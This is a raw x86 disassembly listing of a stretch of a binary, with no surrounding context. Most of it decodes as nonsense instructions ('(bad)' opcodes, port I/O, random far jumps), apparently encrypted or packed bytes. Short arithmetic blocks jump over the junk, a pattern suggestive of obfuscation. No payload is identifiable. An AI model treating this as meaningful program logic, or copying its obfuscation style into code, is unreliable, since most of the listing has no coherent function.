  41d4e3:	add    BYTE PTR [ebp+0x4c576596],dl
  41d4e9:	shl    DWORD PTR ds:[ebp-0x20b2e865],0x38
  41d4f1:	inc    ebx
  41d4f2:	xchg   ebp,eax
  41d4f3:	mov    cl,BYTE PTR ds:[eax+0x2]
  41d4f7:	out    dx,eax
  41d4f8:	cmp    ecx,esi
  41d4fa:	xchg   BYTE PTR [esi+0x7da283c5],cl
  41d500:	icebp  
  41d501:	retf   0xda46
  41d504:	sub    eax,0x39b19684
  41d509:	xor    BYTE PTR [edx],dh
  41d50b:	and    DWORD PTR [eax+0x3],edi
  41d50e:	fidivr DWORD PTR [edx]
  41d510:	inc    esp
  41d511:	imul   BYTE PTR [ecx-0x40]
  41d514:	mov    esi,edx
  41d516:	je     0x41d54b
  41d518:	ror    dl,0xf
  41d51b:	pop    eax
  41d51c:	test   DWORD PTR [esi-0x5cdf3543],eax
  41d522:	cld    
  41d523:	cmp    bh,ch
  41d525:	and    eax,0x16be5b7
  41d52a:	pop    edi
  41d52b:	and    ebp,DWORD PTR [ecx]
  41d52d:	out    dx,eax
  41d52e:	outs   dx,DWORD PTR ds:[esi]
  41d52f:	stos   BYTE PTR es:[edi],al
  41d530:	out    0x1f,al
  41d532:	cwde   
  41d533:	push   ss
  41d534:	lea    ecx,[esi+esi*8-0x3f]
  41d538:	in     eax,dx
  41d539:	loope  0x41d553
  41d53b:	icebp  
  41d53c:	sub    BYTE PTR [esi],0xf5
  41d53f:	and    ah,dh
  41d541:	dec    ebp
  41d542:	mov    DWORD PTR [esi+0xd2a6b57],eax
  41d548:	mov    eax,0xbbc3ce7f
  41d54d:	mov    ebp,0xdb2be7c3
  41d552:	mov    edx,DWORD PTR [edi-0x74b38a7e]
  41d558:	pop    ecx
  41d559:	cwde   
  41d55a:	jge    0x41d4fa
  41d55c:	(bad)  
  41d55e:	mov    ebp,0x1459e571
  41d563:	imul   edi,DWORD PTR [esi-0x4f],0x27127660
  41d56a:	mov    BYTE PTR [edi+eax*4],dh
  41d56d:	add    BYTE PTR [edi-0x16016e08],0xc0
  41d574:	mov    edx,0x3abd7d3f
  41d579:	cmp    al,0xeb
  41d57b:	mov    dh,0x12
  41d57d:	lods   al,BYTE PTR ds:[esi]
  41d57e:	fmul   DWORD PTR [eax]
  41d580:	leave  
  41d581:	push   es
  41d582:	lea    ecx,[ecx+0x7afc2d]
  41d588:	mov    ds:0xa06880e2,al
  41d58d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d58e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d58f:	test   DWORD PTR [ecx+0x45c7fdc1],ebp
  41d595:	clc    
  41d596:	(bad)  
  41d597:	jl     0x41d599
  41d599:	add    bh,al
  41d59b:	inc    ebp
  41d59c:	hlt    
  41d59d:	in     eax,0x2f
  41d59f:	add    BYTE PTR [eax],al
  41d5a1:	jmp    0x41d66d
  41d5a6:	push   0xffffffa8
  41d5a8:	mov    DWORD PTR [ebx-0x6854435],ebx
  41d5ae:	push   ebx
  41d5af:	jae    0x41d5a3
  41d5b1:	or     eax,0x4ebea5f2
  41d5b6:	addr16 push ebp
  41d5b8:	add    DWORD PTR [eax],eax
  41d5ba:	scas   eax,DWORD PTR es:[edi]
  41d5bb:	add    BYTE PTR [eax],al
  41d5bd:	add    BYTE PTR [edx+0x2],cl
  41d5c0:	mov    esp,0xf7b4cd67
  41d5c5:	xor    BYTE PTR gs:[edx],bh
  41d5c8:	cwde   
  41d5c9:	mov    esi,0x918396ba
  41d5ce:	stos   BYTE PTR es:[edi],al
  41d5cf:	int3   
  41d5d0:	pop    ds
  41d5d1:	sub    ah,dh
  41d5d3:	sub    al,0x58
  41d5d5:	pop    ds
  41d5d6:	lock lods eax,DWORD PTR ds:[esi]
  41d5d8:	inc    edx
  41d5d9:	xchg   DWORD PTR [esi-0x5fdf82fa],ebp
  41d5df:	shl    ebx,0x75
  41d5e2:	cmp    al,0xe0
  41d5e4:	pop    ds
  41d5e5:	xchg   BYTE PTR [edx-0x34],dl
  41d5e8:	icebp  
  41d5e9:	jne    0x41d57b
  41d5eb:	xchg   ebp,eax
  41d5ec:	push   0xffffff83
  41d5ee:	repnz mov dl,0x2e
  41d5f1:	cmp    DWORD PTR [esp+ecx*2-0x6f],0x35
  41d5f6:	mov    dl,0x11
  41d5f8:	cmp    edi,DWORD PTR ss:0xa7bef25c
  41d5ff:	jecxz  0x41d5a5
  41d601:	int    0xc0
  41d603:	stos   BYTE PTR es:[edi],al
  41d604:	push   ecx
  41d605:	xchg   ebp,eax
  41d606:	sub    BYTE PTR [ecx-0x5acd89a],ah
  41d60c:	(bad)  
  41d60d:	mov    eax,0x20f8f489
  41d612:	push   cs
  41d613:	lods   eax,DWORD PTR ds:[esi]
  41d614:	xchg   BYTE PTR [edi],bh
  41d616:	loop   0x41d626
  41d618:	mov    BYTE PTR [edi+ebx*4+0x6b22eb7c],bh
  41d61f:	jmp    0x41d5c2
  41d621:	cmp    eax,0xddb621e0
  41d626:	or     BYTE PTR [ecx],cl
  41d628:	(bad)  
  41d62a:	push   eax
  41d62b:	adc    BYTE PTR [esi],ch
  41d62d:	(bad)  
  41d62f:	stos   DWORD PTR es:[edi],eax
  41d630:	cmp    eax,0xdf919270
  41d635:	sar    BYTE PTR [esi+eax*4-0x3cff3c49],1
  41d63c:	mov    edi,0x2c5838db
  41d641:	mov    WORD PTR [esp+ebp*8-0x37778ea2],ds
  41d648:	(bad)  
  41d649:	xchg   edx,eax
  41d64a:	psubusb mm2,QWORD PTR [edi+0x72e518d1]
  41d651:	call   0xe3c2e59c
  41d656:	ins    DWORD PTR es:[di],dx
  41d658:	sbb    edi,DWORD PTR [eax]
  41d65a:	test   BYTE PTR [eax+0x1fd5ac1d],0xd9
  41d661:	add    al,0x88
  41d663:	lods   al,BYTE PTR ds:[esi]
  41d664:	or     BYTE PTR [edx-0x48d05f6c],dl
  41d66a:	test   BYTE PTR [edi],0xe9
  41d66d:	mov    DWORD PTR [ebp-0x10],0x617e
  41d674:	mov    eax,DWORD PTR [ebp-0x10]
  41d677:	push   0x3
  41d679:	pop    edi
  41d67a:	div    edi
  41d67c:	mov    edx,DWORD PTR [ebp-0xc]
  41d67f:	mov    ebx,0x5350
  41d684:	or     eax,edx
  41d686:	mov    edx,DWORD PTR [ebp-0x8]
  41d689:	mov    edi,DWORD PTR [ebp-0x4]
  41d68c:	and    eax,edx
  41d68e:	xor    edx,edx
  41d690:	div    edi
  41d692:	mov    edx,DWORD PTR [ebp-0x14]
  41d695:	mov    edi,DWORD PTR [ebp+0xc]
  41d698:	sub    eax,edx
  41d69a:	xor    eax,0xffffa12d
  41d69f:	mov    edx,ecx
  41d6a1:	jmp    0x41d76d
  41d6a6:	mov    cs,WORD PTR [ebp-0x241526]
  41d6ac:	mov    esi,0xb1cf1ed
  41d6b1:	int    0x74
  41d6b3:	lahf   
  41d6b4:	int    0x2
  41d6b6:	push   ss
  41d6b7:	push   esi
  41d6b8:	add    DWORD PTR [eax],eax
  41d6ba:	scas   eax,DWORD PTR es:[edi]
  41d6bb:	add    BYTE PTR [eax],al
  41d6bd:	add    BYTE PTR [ebp-0x1e],bl
  41d6c0:	(bad)  
  41d6c1:	fisttp QWORD PTR [eax-0x287b0be1]
  41d6c7:	sahf   
  41d6c8:	sbb    al,0x94
  41d6ca:	stc    
  41d6cb:	es pop es
  41d6cd:	jmp    0x9474:0x21609303
  41d6d4:	push   esi
  41d6d5:	loopne 0x41d6cd
  41d6d7:	scas   al,BYTE PTR es:[edi]
  41d6d8:	dec    esi
  41d6d9:	retf   0xb638
  41d6dc:	js     0x41d755
  41d6de:	rcl    DWORD PTR [ebp-0x35],1
  41d6e1:	dec    edi
  41d6e2:	push   eax
  41d6e3:	daa    
  41d6e4:	out    0x3d,eax
  41d6e6:	mov    eax,0x12252ac3
  41d6ec:	mov    eax,ds:0x683a51d
  41d6f1:	sub    al,0xfd
  41d6f3:	fwait
  41d6f4:	(bad)  
  41d6f5:	dec    ebx
  41d6f6:	push   cs
  41d6f7:	pop    DWORD PTR [eax-0x7bddc710]
  41d6fd:	xchg   eax,esp
  41d6ff:	repz jo 0x41d708
  41d702:	ja     0x41d76c
  41d704:	out    0x2e,eax
  41d706:	jmp    0xcd9327d
  41d70b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d70d:	dec    ecx
  41d70e:	add    BYTE PTR [eax-0x2a],ch
  41d711:	test   BYTE PTR [ebp-0x31],bh
  41d714:	lahf   
  41d715:	cmp    ebp,eax
  41d717:	adc    al,0x39
  41d719:	pop    esp
  41d71a:	dec    edi
  41d71b:	xchg   BYTE PTR [eax+esi*8+0x65d442b7],al
  41d722:	inc    DWORD PTR [edx-0x35]
  41d725:	fimul  DWORD PTR [edx]
  41d727:	mov    ch,0x99
  41d729:	ja     0x41d6b4
  41d72b:	mov    cr0,esp
  41d72e:	cmp    cl,BYTE PTR [ecx+eax*1]
  41d731:	adc    DWORD PTR [edx-0x49b4bf54],0xffffffe5
  41d738:	out    0xe7,al
  41d73a:	push   esp
  41d73b:	mov    al,0xd7
  41d73d:	stos   DWORD PTR es:[edi],eax
  41d73e:	rol    DWORD PTR [esi+0x36de90c4],0xfb
  41d745:	addr16 pop edx
  41d747:	adc    DWORD PTR [ecx+ebp*8],0x2e
  41d74b:	fimul  DWORD PTR [ecx+ecx*4+0x37642a08]
  41d752:	pusha  
  41d753:	jo     0x41d7b6
  41d755:	inc    edx
  41d756:	inc    esp
  41d757:	not    DWORD PTR [edi+0x4c]
  41d75a:	adc    DWORD PTR [ebx],ebx
  41d75c:	arpl   WORD PTR [ebp-0x20c57630],bp
  41d762:	sub    al,0xc5
  41d764:	cmp    DWORD PTR [edi],ecx
  41d766:	pop    eax
  41d767:	mov    bh,bl
  41d769:	inc    esi
  41d76a:	sbb    esp,DWORD PTR [eax-0x762fd456]
  41d770:	push   ebp
  41d771:	cld    
  41d772:	mov    eax,DWORD PTR [ebp-0x4]
  41d775:	mov    edx,DWORD PTR [ebp-0x4]
  41d778:	mov    dl,BYTE PTR [edx+edi*1]
  41d77b:	jmp    0x41d847
  41d780:	and    eax,DWORD PTR [edi-0x45]
  41d783:	(bad)  
  41d785:	jmp    DWORD PTR [ebx-0x1]
  41d788:	pop    ss
  41d789:	mov    ds:0x8db6a189,eax
  41d78e:	xor    eax,edi
  41d790:	lds    edx,FWORD PTR [esi+0x1]
  41d793:	add    BYTE PTR [edi-0x3c000000],ch
  41d799:	and    dh,dh
  41d79b:	push   esp
  41d79c:	cmp    DWORD PTR [esi+0x1dea70e5],ecx
  41d7a2:	mov    al,ds:0xd5dfd1d7
  41d7a7:	std    
  41d7a8:	fldcw  WORD PTR [ebp+0x52bcb166]
  41d7ae:	xor    al,BYTE PTR [ebp+ecx*8+0x4f]
  41d7b2:	pusha  
  41d7b3:	popa   
  41d7b4:	dec    edx
  41d7b5:	addr16 sahf 
  41d7b7:	jns    0x41d820
  41d7b9:	mov    cl,0xdb
  41d7bb:	dec    eax
  41d7bc:	data16 clc 
  41d7be:	sub    eax,0xd0db1fc1
  41d7c3:	lahf   
  41d7c4:	and    BYTE PTR [edx-0x189929d8],bl
  41d7ca:	loopne 0x41d7ba
  41d7cc:	les    ecx,FWORD PTR [edi-0x34265a9f]
  41d7d2:	jmp    DWORD PTR [eax+0xb]
  41d7d5:	dec    edi
  41d7d6:	fnsave [edx+0x3787cabd]
  41d7dc:	outs   dx,DWORD PTR ds:[esi]
  41d7dd:	lahf   
  41d7de:	xchg   ebp,eax
  41d7df:	mov    ds,WORD PTR [esi-0x54]
  41d7e2:	add    al,bl
  41d7e4:	shl    BYTE PTR [ebp-0x4ffbab8d],1
  41d7ea:	imul   ebx,DWORD PTR [ecx+eiz*4-0x42],0x9376020d
  41d7f2:	add    esp,edx
  41d7f4:	inc    edi
  41d7f5:	dec    ebx
  41d7f6:	ss pop es
  41d7f8:	mov    ds:0xeb8e3e73,al
  41d7fd:	mov    ds:0xb8affa74,eax
  41d802:	enter  0x6aba,0x8f
  41d806:	xchg   cl,dl
  41d808:	inc    ecx
  41d809:	adc    ebp,ecx
  41d80b:	xor    al,0x89
  41d80d:	lods   al,BYTE PTR ds:[esi]
  41d80e:	adc    ebp,DWORD PTR [ebx-0x13]
  41d811:	jmp    0xc4b:0x1c121774
  41d818:	loopne 0x41d7f9
  41d81a:	mov    eax,0x79857d19
  41d81f:	sahf   
  41d820:	pusha  
  41d821:	(bad)  
  41d822:	xor    DWORD PTR [eax],0x63
  41d825:	retf   
  41d826:	int3   
  41d827:	sub    al,0xbc
  41d829:	adc    al,0x8d
  41d82b:	mov    DWORD PTR [eax],edx
  41d82d:	jae    0x41d81c
  41d82f:	jne    0x41d844
  41d831:	pop    ebx
  41d832:	mov    DWORD PTR [ecx],0x2ad355a2
  41d838:	fsub   st,st(2)
  41d83a:	sar    al,cl
  41d83c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d83d:	jg     0x41d877
  41d83f:	and    eax,0xca77751
  41d844:	adc    cl,ch
  41d846:	arpl   WORD PTR [ebx+0x1488087d],cx
  41d84c:	cmp    cl,ch
  41d84e:	mov    DWORD PTR [eax],0x17100000
  41d854:	jae    0x41d85a
  41d856:	ja     0x41d8bc
  41d858:	ja     0x41d871
  41d85a:	pop    eax
  41d85b:	sbb    esp,DWORD PTR [eax]
  41d85d:	mov    eax,ds:0xdeb66e2
  41d862:	je     0x41d8bb
  41d864:	add    DWORD PTR [eax],eax
  41d866:	scas   eax,DWORD PTR es:[edi]
  41d867:	add    BYTE PTR [eax],al
  41d869:	add    BYTE PTR [esi+0x1ea99d4],bh
  41d86f:	push   0xffffff9b
  41d871:	pop    esi
  41d872:	mov    bh,0xcf
  41d874:	xlat   BYTE PTR ds:[ebx]
  41d875:	aam    0xfc
  41d877:	sbb    edx,esi
  41d879:	icebp  
  41d87a:	dec    edi
  41d87b:	shl    esp,0x2f
  41d87e:	xchg   esi,eax
  41d87f:	mov    ds:0x8708e9b2,al
  41d884:	arpl   cx,bx
  41d886:	test   bh,dl
  41d888:	adc    eax,0xe7ee077b
  41d88d:	lock or edi,ebx
  41d890:	dec    eax
  41d891:	pop    es
  41d892:	cli    
  41d893:	add    BYTE PTR [eiz*1-0x4e09a257],dl
  41d89a:	ret    0x3c99
  41d89d:	or     BYTE PTR [edx-0x76],ch
  41d8a0:	sub    al,0x12
  41d8a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8a3:	or     ebp,DWORD PTR [edi]
  41d8a5:	push   esi
  41d8a6:	popa   
  41d8a7:	push   ss
  41d8a8:	out    dx,eax
  41d8a9:	pop    ds
  41d8aa:	push   edx
  41d8ab:	adc    BYTE PTR [eax+0x2a3e25ba],0xf8
  41d8b2:	inc    ebx
  41d8b3:	ret    
  41d8b4:	stos   BYTE PTR es:[edi],al
  41d8b5:	or     BYTE PTR [edx+0x3af8058],ah
  41d8bb:	popf   
  41d8bc:	outs   dx,DWORD PTR ds:[esi]
  41d8bd:	inc    eax
  41d8be:	dec    ecx
  41d8bf:	scas   eax,DWORD PTR es:[edi]
  41d8c0:	or     dl,ah
  41d8c2:	and    DWORD PTR [esi],eax
  41d8c4:	(bad)  
  41d8c5:	call   0xcf4bd87a
  41d8ca:	retf   
  41d8cb:	mov    eax,ds:0x3a24db45
  41d8d0:	fs loop 0x41d941
  41d8d3:	int3   
  41d8d4:	inc    ecx
  41d8d5:	dec    esi
  41d8d6:	test   BYTE PTR [ecx-0x5b],ch
  41d8d9:	pop    eax
  41d8da:	outs   dx,DWORD PTR ds:[esi]
  41d8db:	ds jmp 0xdfcc3602
  41d8e1:	push   es
  41d8e2:	mov    esi,0x96e6d748
  41d8e7:	iret   
  41d8e8:	out    0x2a,al
  41d8ea:	js     0x41d8c2
  41d8ec:	push   edi
  41d8ed:	ja     0x41d896
  41d8ef:	push   ds
  41d8f0:	sti    
  41d8f1:	popf   
  41d8f2:	addr16 cwde 
  41d8f4:	mov    edi,0x68211575
  41d8f9:	gs sub al,0x10
  41d8fc:	xor    ecx,DWORD PTR [esi+0x36]
  41d8ff:	dec    edi
  41d900:	hlt    
  41d901:	mov    ecx,DWORD PTR [edx+0x72]
  41d904:	adc    eax,0x94fc0cdc
  41d909:	jns    0x41d8ec
  41d90b:	mov    esp,0x221ec873
  41d910:	imul   ebx,ebx,0xd8da9e7c
  41d916:	xchg   ecx,eax
  41d917:	hlt    
  41d918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d919:	mov    eax,DWORD PTR [ebp-0x18]
  41d91c:	jmp    0x41d9e8
  41d921:	sbb    ah,dl
  41d923:	push   edx
  41d924:	fs cli 
  41d926:	hlt    
  41d927:	ds (bad) 
  41d929:	in     eax,dx
  41d92a:	scas   eax,DWORD PTR es:[edi]
  41d92b:	push   edx
  41d92c:	jae    0x242670c1
  41d932:	pop    eax
  41d933:	add    DWORD PTR [eax],eax
  41d935:	scas   eax,DWORD PTR es:[edi]
  41d936:	add    BYTE PTR [eax],al
  41d938:	add    dl,ch
  41d93a:	gs ja  0x41d98d
  41d93d:	cmp    BYTE PTR [ecx-0x6],dl
  41d940:	sub    eax,0x846fb69e
  41d945:	inc    eax
  41d946:	cmp    al,bh
  41d948:	lea    ebx,[ebx+0xadd66ff]
  41d94e:	sub    eax,0x20e7a768
  41d953:	sub    eax,0xb4daceee
  41d958:	pop    ds
  41d959:	xchg   esi,eax
  41d95a:	push   esi
  41d95b:	jns    0x41d96d
  41d95d:	inc    esp
  41d95e:	dec    esi
  41d95f:	fs out dx,eax
  41d961:	jbe    0x41d8ec
  41d963:	pop    ebx
  41d964:	addr16 xor ecx,ecx
  41d967:	jnp    0x41d920
  41d969:	cdq    
  41d96a:	inc    eax
  41d96b:	mov    eax,?
  41d96d:	data16 xchg BYTE PTR [edi-0x1e6a9a31],bl
  41d974:	xchg   si,ax
  41d976:	inc    eax
  41d977:	and    al,0x5d
  41d979:	retf   0x1999
  41d97c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d97d:	xchg   ebx,eax
  41d97e:	lahf   
  41d97f:	mov    ?,WORD PTR [edi-0x4c]
  41d982:	mov    edi,esi
  41d984:	inc    esi
  41d985:	or     eax,0x910b9610
  41d98a:	scas   al,BYTE PTR es:[edi]
  41d98b:	mov    eax,0xff7e1e58
  41d990:	or     eax,0xad685d57
  41d995:	xor    edi,DWORD PTR [esi+ecx*8]
  41d998:	hlt    
  41d999:	mov    ch,0x56
  41d99b:	fldcw  WORD PTR [eax+0x5a6f5b95]
  41d9a1:	mov    ch,0xcb
  41d9a3:	call   0x62fe7722
  41d9a8:	jb     0x41d9e2
  41d9aa:	out    dx,al
  41d9ab:	enter  0xc051,0xb8
  41d9af:	lock lahf 
  41d9b1:	(bad)  
  41d9b2:	es mov eax,0xa1b6a5a0
  41d9b8:	dec    edi
  41d9b9:	lea    esi,[ebx+0x79224199]
  41d9bf:	add    esp,DWORD PTR [esi]
  41d9c1:	je     0x41d9d4
  41d9c3:	adc    BYTE PTR [edi-0x20715d57],dh
  41d9c9:	(bad)  
  41d9ca:	sub    BYTE PTR [ebp+0x5a7dece8],al
  41d9d0:	adc    bh,BYTE PTR [ebp+0x4edc9ecb]
  41d9d6:	jb     0x41d98b
  41d9d8:	xchg   ebp,eax
  41d9d9:	pop    edx
  41d9da:	shl    DWORD PTR [eax],1
  41d9dc:	loop   0x41da49
  41d9de:	imul   ebx,DWORD PTR [ebx],0x4f
  41d9e1:	fldcw  WORD PTR [eax+0x51]
  41d9e4:	mov    dh,0x8d
  41d9e6:	(bad)  
  41d9e8:	mov    edx,DWORD PTR [ebp-0x1c]
  41d9eb:	sub    edx,eax
  41d9ed:	mov    eax,DWORD PTR [ebp-0x20]
  41d9f0:	imul   edx,eax
  41d9f3:	jmp    0x41dabf
  41d9f8:	out    0x80,al
  41d9fa:	int    0x58
  41d9fc:	out    dx,eax
  41d9fd:	pop    ebp
  41d9fe:	idiv   DWORD PTR [esi+0x333e8eab]
  41da04:	call   0x158:0xd26db506
  41da0b:	add    BYTE PTR [edi+0x3d000000],ch
  41da11:	stos   DWORD PTR es:[di],eax
  41da13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da14:	leave  
  41da15:	lahf   
  41da16:	pop    edx
  41da17:	ret    0xcda6
  41da1a:	adc    al,0x9b
  41da1c:	pop    edx
  41da1d:	lods   al,BYTE PTR ds:[esi]
  41da1e:	repnz inc esp
  41da20:	and    edx,DWORD PTR [ebx+esi*8]
  41da23:	in     al,0xa9
  41da25:	mov    ebx,0xe3d27e9f
  41da2a:	push   0x27
  41da2c:	inc    esp
  41da2d:	pop    edi
  41da2e:	ins    BYTE PTR es:[edi],dx
  41da2f:	(bad)
  41da32:	mov    WORD PTR [eax],cs
  41da34:	sub    al,0x69
  41da36:	xor    ebp,DWORD PTR [edi-0x52]
  41da39:	loope  0x41da19
  41da3b:	std    
  41da3c:	and    al,0x72
  41da3e:	jl     0x41da4d
  41da40:	inc    eax
  41da41:	push   0x5439e1f6
  41da46:	hlt    
  41da47:	pop    edi
  41da48:	or     eax,0xef2636bf
  41da4d:	paddq  mm0,mm7
  41da50:	(bad)  
  41da51:	pushf  
  41da52:	adc    al,0x58
  41da54:	dec    edx
  41da55:	push   ebp
  41da56:	std    
  41da57:	or     eax,0x539cdd73
  41da5c:	jp     0x41dabb
  41da5e:	lock int3 
  41da60:	cdq    
  41da61:	and    ch,BYTE PTR [eax]
  41da63:	mov    cl,0x5f
  41da65:	scas   eax,DWORD PTR es:[edi]
  41da66:	bnd js 0x41da7e
  41da69:	xor    dx,sp
  41da6c:	dec    ebp
  41da6d:	pop    ecx
  41da6e:	mov    ebp,0xad895ae4
  41da73:	fsubr  QWORD PTR [ebx-0x59]
  41da76:	push   ss
  41da77:	jmp    0x41da73
  41da79:	stos   DWORD PTR es:[edi],eax
  41da7a:	sbb    eax,0xb1dbd192
  41da7f:	adc    DWORD PTR [esi-0x7c5093ea],0xffffffb3
  41da86:	xor    al,0xe0
  41da88:	sbb    al,0x44
  41da8a:	stc    
  41da8b:	dec    ebp
  41da8c:	and    al,0xe5
  41da8e:	aad    0x78
  41da90:	adc    BYTE PTR [ebx],dl
  41da92:	in     eax,0x21
  41da94:	jo     0x41da78
  41da96:	cdq    
  41da97:	outs   dx,DWORD PTR ds:[esi]
  41da98:	outs   dx,DWORD PTR ds:[esi]
  41da99:	cmp    al,0xb0
  41da9b:	or     BYTE PTR ds:0x1df934aa,dl
  41daa1:	mov    dl,0x82
  41daa3:	scas   eax,DWORD PTR es:[edi]
  41daa4:	jge    0x41da8c
  41daa6:	push   eax
  41daa7:	or     BYTE PTR [edx+eiz*4],0xb2
  41daab:	pusha  
  41daac:	xor    BYTE PTR [ebx+0x2cda8d34],bl
  41dab2:	sbb    al,0xc3
  41dab4:	data16 (bad) 
  41dab6:	out    0xf0,al
  41dab8:	aaa    
  41dab9:	rol    DWORD PTR [edi-0x791fbe5d],0x69
  41dac0:	shr    BYTE PTR [esi+0x39],cl
  41dac3:	add    BYTE PTR [eax],al
  41dac5:	xor    edx,0x376b
  41dacb:	jmp    0x41db97
  41dad0:	(bad)  
  41dad1:	jecxz  0x41daba
  41dad3:	(bad)  
  41dad4:	out    0xc4,eax
  41dad6:	out    0xe3,eax
  41dad8:	xchg   edi,eax
  41dad9:	ja     0x41daad
  41dadb:	ficomp DWORD PTR [eax]
  41dadd:	cmp    esi,ecx
  41dadf:	int    0x81
  41dae1:	pop    ecx
  41dae2:	add    DWORD PTR [eax],eax
  41dae4:	scas   eax,DWORD PTR es:[edi]
  41dae5:	add    BYTE PTR [eax],al
  41dae7:	add    BYTE PTR [edi-0x15],bl
  41daea:	ret    
  41daeb:	or     al,0x35
  41daed:	adc    eax,0x713c510
  41daf2:	sub    ch,dh
  41daf4:	aaa    
  41daf5:	in     eax,0x8d
  41daf7:	mov    edx,ebx
  41daf9:	inc    eax
  41dafa:	mov    eax,0x4d593439
  41daff:	stc    
  41db00:	push   0xc15e2c39
  41db05:	mov    ah,0x49
  41db07:	mov    ds:0xfaceae3b,eax
  41db0c:	inc    esp
  41db0d:	mov    bl,0x1c
  41db0f:	test   DWORD PTR [ebx],esi
  41db11:	xchg   edi,esp
  41db13:	add    BYTE PTR [ecx-0x32],al
  41db16:	jb     0x41dae9
  41db18:	mov    bh,0x65
  41db1a:	dec    esp
  41db1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db1c:	add    eax,0x106035a7
  41db21:	inc    eax
  41db22:	xchg   BYTE PTR [ebx+ebx*4+0x7aec11ea],ah
  41db29:	loope  0x41dad2
  41db2b:	jmp    0x7a07:0xb44596aa
  41db32:	xor    al,0x76
  41db34:	call   0xce3635e5
  41db39:	nop
  41db3a:	rol    DWORD PTR [ebp+0x55],0xca
  41db3e:	sub    DWORD PTR [eax-0x4f4bee11],esp
  41db44:	sbb    esi,DWORD PTR [edx]
  41db46:	std    
  41db47:	in     eax,0x81
  41db49:	push   edx
  41db4a:	stc    
  41db4b:	arpl   WORD PTR [ecx],ax
  41db4d:	mov    esi,0x21022fa
  41db52:	js     0x41db14
  41db54:	lods   al,BYTE PTR ds:[esi]
  41db55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db56:	sub    eax,0x557ee818
  41db5b:	test   BYTE PTR [ebx-0x61],bl
  41db5e:	inc    ebx
  41db5f:	mov    al,ds:0xc7cd82b1
  41db64:	pop    ds
  41db65:	fsubr  DWORD PTR [edi-0x50]
  41db68:	js     0x41db43
  41db6a:	pop    ds
  41db6b:	(bad)  
  41db6c:	out    dx,al
  41db6d:	int3   
  41db6e:	addr16 jp 0x41db19
  41db71:	and    ecx,DWORD PTR [esi-0x94b93da]
  41db77:	pusha  
  41db78:	mov    ds:0x2a2f6b48,al
  41db7d:	sbb    eax,0x9d6bd971
  41db82:	jne    0x41db1c
  41db84:	lods   eax,DWORD PTR ds:[esi]
  41db85:	sub    ebp,DWORD PTR [ecx+edi*4]
  41db88:	jge    0x41db95
  41db8a:	and    ebp,DWORD PTR [ecx+eiz*4]
  41db8d:	mov    al,0xc
  41db8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db90:	jp     0x41db94
  41db92:	sub    eax,esp
  41db94:	addr16 and eax,0xdc55034f
  41db9a:	mov    eax,DWORD PTR [ebp-0x28]
  41db9d:	jmp    0x41dc69
  41dba2:	cld    
  41dba3:	jp     0x41db6a
  41dba5:	jmp    0x41db6e
  41dba7:	(bad)  
  41dba8:	(bad)  
  41dba9:	jg     0x41dba9
  41dbab:	jg     0x41db89
  41dbad:	xor    edi,DWORD PTR [ebp+edi*1+0x25]
  41dbb1:	xor    BYTE PTR gs:[edx+0x1],bl
  41dbb5:	add    BYTE PTR [edi-0x7f000000],ch
  41dbbb:	loop   0x41db88
  41dbbd:	xchg   DWORD PTR [eax],esi
  41dbbf:	ja     0x41dbb4
  41dbc1:	mov    edx,0xe1bdd937
  41dbc6:	pop    es
  41dbc7:	leave  
  41dbc8:	fwait
  41dbc9:	sbb    DWORD PTR [edx-0x7212c90],esp
  41dbcf:	push   0x3262ddbd
  41dbd4:	test   al,0xb5
  41dbd6:	add    eax,0xa1f165a2
  41dbdb:	push   eax
  41dbdc:	ret    
  41dbdd:	js     0x41db95
  41dbdf:	lock ret 
  41dbe1:	lods   eax,DWORD PTR ds:[esi]
  41dbe2:	push   ebp
  41dbe3:	ins    BYTE PTR es:[edi],dx
  41dbe4:	or     BYTE PTR [edx],al
  41dbe6:	ins    DWORD PTR es:[edi],dx
  41dbe7:	fcom   DWORD PTR [edx-0x1f7687ce]
  41dbed:	fsubrp st(0),st
  41dbef:	mov    ch,0x61
  41dbf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbf2:	shr    BYTE PTR [ebx],0x92
  41dbf5:	icebp  
  41dbf6:	lds    eax,FWORD PTR [ebp-0x4bde7bab]
  41dbfc:	mov    BYTE PTR ds:[ecx+0x5],0xd3
  41dc01:	popa   
  41dc02:	call   0x9c9660eb
  41dc07:	sub    BYTE PTR [eax-0x6e742793],cl
  41dc0d:	jge    0x41dbbe
  41dc0f:	mov    edi,0xb546eb63
  41dc14:	mov    ebx,0xd84c13c2
  41dc19:	pop    ebx
  41dc1a:	in     al,0xe2
  41dc1c:	or     esi,DWORD PTR [edi]
  41dc1e:	dec    BYTE PTR [ebx]
  41dc20:	sbb    ebp,ebx
  41dc22:	sbb    edx,DWORD PTR [edi]
  41dc24:	fiadd  WORD PTR [ecx+0x34d048be]
  41dc2a:	xchg   esp,eax
  41dc2b:	sbb    BYTE PTR [esi+0x10],0xde
  41dc2f:	inc    eax
  41dc30:	popa   
  41dc31:	cwde   
  41dc32:	add    al,0x83
  41dc34:	jle    0x41dc9d
  41dc36:	pop    esp
  41dc37:	mov    WORD PTR [ecx],fs
  41dc39:	ficom  WORD PTR [esi-0xf0cf493]
  41dc3f:	nop
  41dc40:	rol    DWORD PTR [ecx],0x18
  41dc43:	inc    ebp
  41dc44:	fisub  WORD PTR [ecx]
  41dc46:	cs inc esi
  41dc48:	scas   al,BYTE PTR es:[edi]
  41dc49:	mov    dl,0x92
  41dc4b:	or     edx,0x44
  41dc4e:	push   edi
  41dc4f:	jb     0x41dc7f
  41dc51:	jle    0x41dc27
  41dc53:	mov    ah,0xce
  41dc55:	xor    DWORD PTR [eax+0x4461863],esi
  41dc5b:	fs popa 
  41dc5d:	out    dx,eax
  41dc5e:	xchg   dh,dh
  41dc60:	cmp    BYTE PTR [edx],ah
  41dc62:	mov    edi,0xebe3de46
  41dc67:	mov    ch,0xca
